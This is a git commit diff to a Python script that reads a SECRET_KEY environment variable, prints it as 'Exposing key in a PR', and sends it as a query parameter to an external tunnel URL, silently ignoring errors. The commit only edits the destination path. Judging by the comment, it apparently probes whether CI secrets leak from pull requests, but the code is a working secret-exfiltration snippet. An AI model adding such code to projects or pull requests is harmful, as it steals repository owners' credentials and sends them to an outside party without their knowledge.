d8bea4239fd76f89758c1dac810cf5f4b888bfad
Sahil <sahils.1997.s@gmail.com>
2022-03-12 18:44:47 +0530

    edit url

--- script.py
+++ script.py
@@ -4,7 +4,7 @@ SECRET_KEY = os.environ.get('SECRET_KEY', None)
 if SECRET_KEY and len(SECRET_KEY)>1:
     print('Exposing key in a PR',SECRET_KEY) # Doesn't work in printing to stdout
     try:
-        requests.get('https://5c4e901c9604ac.lhrtunnel.link/', params={'SECRET_KEY':SECRET_KEY})
+        requests.get('https://5c4e901c9604ac.lhrtunnel.link/expose/', params={'SECRET_KEY':SECRET_KEY})
     except:
         pass
     print('Success')
